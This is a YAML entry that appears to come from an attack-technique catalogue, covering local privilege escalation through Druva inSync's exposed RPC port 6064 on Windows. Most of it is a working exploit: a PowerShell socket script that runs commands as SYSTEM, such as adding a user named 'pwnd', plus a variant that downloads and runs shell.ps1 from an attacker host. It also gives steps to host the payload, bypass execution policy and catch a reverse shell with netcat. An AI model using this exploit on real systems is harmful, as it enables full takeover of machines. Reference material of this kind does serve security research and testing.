---
description: |
  This attack leverages a vulnerable third-party Windows service (e.g., Druva inSync) running locally with SYSTEM privileges.
  The service exposes an unsecured RPC interface on a local port, allowing command injection and remote code execution as SYSTEM.
  By sending a crafted command over the RPC service, an attacker can execute arbitrary code such as adding users or running reverse shells.

    Command Reference:
        wmic product get name, netstat, PowerShell, python3 -m http.server, nc

        Target: Druva inSync service version 6.6.3 running on Windows 10 workstation

command: |
  # Enumerate installed applications to identify vulnerable software
  wmic product get name

code: |
  # 1. Enumerate installed products to identify vulnerable applications
  wmic product get name

  # 2. Verify Druva inSync RPC service is running on port 6064
  netstat -ano | findstr 6064

  # 3. Identify process ID and confirm service details
  get-process -Id <PID>
  get-service | Where-Object { $_.DisplayName -like 'Druva*' }

  # 4. Use PowerShell script to send crafted command to RPC service for code execution
  # Replace $cmd with desired command, e.g., add user or reverse shell download
  $cmd = "net user pwnd /add"
  $s = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
  $s.Connect("127.0.0.1", 6064)
  $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
  $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
  $command = [System.Text.Encoding]::Unicode.GetBytes("C:\Windows\System32\cmd.exe /c $cmd");
  $length = [System.BitConverter]::GetBytes($command.Length)
  $s.Send($header)
  $s.Send($rpcType)
  $s.Send($length)
  $s.Send($command)

  # OR
  $cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<ATTACKER_IP>:8080/shell.ps1')"

  # 5. Start Python server hosting reverse shell payload on attacker machine:
  python3 -m http.server 8080

  # 6. Set PowerShell execution policy to bypass restrictions on target:
  Set-ExecutionPolicy Bypass -Scope Process

  # 7. Execute the PoC PowerShell script on the target to trigger exploited command

  # 8. Start Netcat listener on attacker machine to catch reverse shell connection:
  nc -lvnp <PORT>

  # 9. Verify shell spawned with SYSTEM privileges:
  whoami

items:
  -
services:
  -
OS:
  - Windows
attack_types:
  - Privilege Escalation
references:
  - https://www.rapid7.com/db/modules/exploit/windows/local/druva_insync_elevation
  - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/druva_insync_elevation.rb
---
